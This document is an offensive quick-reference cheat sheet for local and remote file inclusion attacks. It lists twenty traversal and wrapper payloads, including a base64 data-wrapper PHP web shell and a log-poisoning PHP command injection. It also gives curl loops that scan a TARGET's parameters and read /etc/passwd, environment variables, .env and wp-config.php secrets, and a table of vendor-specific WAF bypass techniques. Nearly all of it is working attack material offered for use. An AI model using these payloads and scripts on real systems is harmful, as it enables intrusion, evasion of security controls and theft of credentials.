# LFI-RFI Master Payload List — Quick Reference
# UPDATED: 1800+ payloads in lfi-payloads.txt — this is a distilled quick-start guide.

## Top 20 Most Likely to Work (Test in Order)

```bash
# 1. Basic traversal (most common)
../../../etc/passwd

# 2. PHP filter source disclosure
php://filter/convert.base64-encode/resource=index.php

# 3. Double encoding (WAF bypass #1)
..%252f..%252f..%252fetc%252fpasswd

# 4. Overlong UTF-8 (IIS/Tomcat bypass)
..%c0%af..%c0%afetc%c0%afpasswd

# 5. Absolute path (/etc/passwd bypass)
/etc/passwd

# 6. PHP filter chain RCE (Synacktiv — no file write)
php://filter/[chain]/resource=php://temp

# 7. Data wrapper (allow_url_include)
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+

# 8. Apache CVE-2021-41773 (2.4.49)
/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd

# 9. UTF-16 Unicode bypass (Akamai/Cloudflare)
%u002e%u002e%u2215%u002e%u002e%u2215etc%u2215passwd

# 10. Semicolon bypass (Java/Tomcat/Spring)
..;/..;/..;/etc/passwd

# 11. Nginx alias traversal
/files../etc/passwd

# 12. Log poisoning UA injection
User-Agent: <?php system('id'); ?>
→ /var/log/apache2/access.log

# 13. Base64-encoded path (custom WAF bypass)
Li4vLi4vLi4vZXRjL3Bhc3N3ZA==

# 14. Triple encoding (ModSecurity/AWS)
%25252e%25252e%25252fetc%25252fpasswd

# 15. Full-width character (charset filter bypass)
．．／．．／etc／passwd

# 16. Payload padding (Cloudflare 8KB bypass)
../../etc/passwd + 10KB junk

# 17. Chunked transfer encoding (Cloudflare bypass)
curl -H "Transfer-Encoding: chunked"

# 18. Header-based bypass (X-Original-URL)
-H "X-Original-URL: /page=../../../etc/passwd"

# 19. Apache mod_rewrite CVE-2024-38475
/path%3F../../../../etc/passwd

# 20. Jolokia ! delimiter
!..!..!..!..!etc!passwd
```

## Quick Win — Test All Parameters at Once

```bash
# Rapid LFI scan — test all common parameters with multiple bypasses
for param in file page path doc template view read load include inc; do
  for payload in \
    "../../../etc/passwd" \
    "..%252f..%252f..%252fetc%252fpasswd" \
    "php://filter/convert.base64-encode/resource=index.php" \
    "/etc/passwd" \
    "..%c0%af..%c0%afetc%c0%afpasswd"; do
    result=$(curl -sk "https://TARGET?$param=$payload" 2>/dev/null)
    if echo "$result" | grep -q "root:x"; then
      echo "[FOUND] $param=$payload"
    elif echo "$result" | grep -q "PD9"; then
      echo "[FOUND PHP FILTER] $param=$payload"
    fi
  done
done
```

## Parameter Names — Full List

```
High probability:
  file=    page=    path=    doc=      template=    view=
  include= load=    read=    pdf=      down=        data=

Medium probability:
  cat=     dir=     show=    src=      href=        url=
  lang=    root=    cfg=     config=   log=         upload=
  image=   img=     media=   theme=    inc=         require=
  f=       action=  plugin=  module=   style=

Lower probability:
  import=  document= controller= function=  attachment=
  download= resume=  backup=     logfile=   process=
  cmd=     exec=     command=    location=  folder=
  doc=     result=   step=       loop=      filename=    resource=
```

## Web App-Specific Parameters

```
Laravel:                file=, path=, template=, view=
WordPress:              page=, file=, load=, template=
Grafana:                plugin=, file=, path=
Joomla:                 option=, view=, layout=, template=
Drupal:                 q=, file=, path=
Confluence:             pageId=, spaceKey=, expand=
Apache:                 page=, file=, path=
Nginx:                  files=, static=, download=
Tomcat/JBoss:           path=, file=, action=
IIS:                    path=, file=, page=
Spring Boot:            path=, file=, n=get
Python/Django:          page=, file=, template=
Ruby/Rails:             page=, file=, template=
```

## Best WAF Bypass by WAF Type

```
WAF Type            Best Bypass Technique
────────────────────────────────────────────────────
Cloudflare (free)   Payload padding (8KB+), chunked TE
Cloudflare (paid)   UTF-16 encoding, parameter pollution
AWS WAF             Triple encoding, JSON body, base64
ModSecurity/CRS     Absolute path, null byte, tab injection
Imperva             Polyglot payloads, HPP, semicolon
F5 BIG-IP           HTTP/2 downgrade, mixed slash
Akamai              Unicode normalization, full-width chars
Azure WAF           POST method switch, header injection
Sucuri/Wordfence    PHP filter chain, log poisoning
```

## Instant Impact Check

```bash
# Check for secrets in first 30 seconds
for file in \
  "../../../etc/passwd" \
  "../../../proc/self/environ" \
  "../../../.env" \
  "../../../wp-config.php" \
  "php://filter/convert.base64-encode/resource=index.php"; do
  echo "=== $file ==="
  curl -sk "https://TARGET/page=$file" | head -5
done
```
